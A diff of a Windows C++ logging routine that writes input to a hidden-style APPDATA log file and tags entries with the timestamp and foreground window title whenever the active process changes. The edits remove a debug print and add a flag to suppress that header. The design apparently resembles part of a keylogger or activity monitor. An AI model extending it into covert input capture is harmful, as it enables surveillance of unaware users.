@@ -4,8 +4,6 @@
 #define APPDATA "APPDATA"
 #define LOG_FILE_NAME "blxrlog.txt"
 
-static uint32_t null_val = 0x0;
-
 // TODO Doesn't work when not initialized on declaration
 stream::LogFile *log_file = new stream::LogFile(stream::GetPath(true), LOG_FILE_NAME);
 
@@ -30,10 +28,9 @@ bool stream::MakeDir(const std::string &path) {
 	  || GetLastError()==ERROR_ALREADY_EXISTS;
 }
 
-bool stream::WriteLog(const std::string &input, uint32_t &active = null_val) {
+bool stream::WriteLog(const std::string &input, uint32_t &active, const bool block_process_info) {
   bool process_info = false;
   uint32_t cur = system_data::GetProcessId();
-  std::cout << cur << " " << active << std::endl;
   if (system_data::ProcessChanged(active, cur, true)) {
 	process_info = true;
   }
@@ -42,7 +39,7 @@ bool stream::WriteLog(const std::string &input, uint32_t &active = null_val) {
   if (!log_file->ofstream_.is_open()) {
 	return false;
   }
-  if (process_info) {
+  if (process_info && !block_process_info) {
 	log_file->ofstream_ << std::endl << "[" << system_time::SystemTime::Now().GetFullDate() << " " << std::endl;
 	log_file->ofstream_ << convert::HwndToString(GetForegroundWindow()) << "]" << std::endl;
   }
